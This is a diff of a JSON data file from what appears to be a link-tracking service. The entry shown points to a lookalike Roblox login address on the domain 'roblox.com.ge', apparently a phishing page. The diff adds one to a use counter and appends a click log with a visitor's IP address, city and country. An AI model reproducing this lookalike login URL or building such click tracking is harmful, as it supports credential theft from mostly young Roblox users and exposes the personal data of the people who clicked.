@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1499,
+    "useCount": 1500,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12160,6 +12160,14 @@
         "city": "Ho Chi Minh City",
         "flag": "🇻🇳",
         "countryCode": "VN"
+      },
+      {
+        "timestamp": 1777443073124,
+        "ip": "177.236.11.111",
+        "country": "Mexico",
+        "city": "Chihuahua City",
+        "flag": "🇲🇽",
+        "countryCode": "MX"
       }
     ]
   },
